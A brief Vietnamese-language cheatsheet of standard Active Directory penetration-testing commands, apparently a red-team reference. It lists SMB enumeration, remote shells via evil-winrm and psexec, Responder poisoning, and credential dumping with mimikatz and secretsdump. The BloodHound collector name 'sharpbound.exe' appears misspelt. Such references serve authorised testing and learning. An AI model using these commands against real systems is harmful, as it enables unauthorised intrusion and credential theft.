# 🛡️ Red Team AD Pentest Cheatsheet

Tổng hợp các câu lệnh khai thác Active Directory phổ biến.

---

## 🔍 Dò quét (Enumeration)
| Tool | Command | Mục đích |
| :--- | :--- | :--- |
| `nmap` | `nmap -sC -sV -p- <IP>` | Quét toàn bộ dịch vụ |
| `enum4linux` | `enum4linux -a <IP>` | Liệt kê thông tin SMB/Users |
| `crackmapexec` | `cme smb <IP> -u '' -p ''` | Quét Null Session SMB |

## 🚪 Khai thác & Chiếm quyền (Exploitation)
| Tool | Command | Mục đích |
| :--- | :--- | :--- |
| `evil-winrm` | `evil-winrm -i <IP> -u <User> -p <Pass>` | Lấy Shell qua WinRM |
| `responder` | `sudo responder -I eth0 -dw` | Giai đoạn Poisoning LLMNR/NBT-NS |
| `impacket` | `psexec.py domain/user:pass@IP` | Lấy shell qua SMB/Psexec |

## 👑 Leo thang đặc quyền (PrivEsc)
| Tool | Command | Mục đích |
| :--- | :--- | :--- |
| `mimikatz` | `sekurlsa::logonpasswords` | Dump mật khẩu từ bộ nhớ (RAM) |
| `bloodhound` | `sharpbound.exe -c All` | Thu thập dữ liệu quan hệ AD |
| `secretsdump` | `secretsdump.py -ntds ntds.dit -system system LOCAL` | Dump NTDS.dit offline |
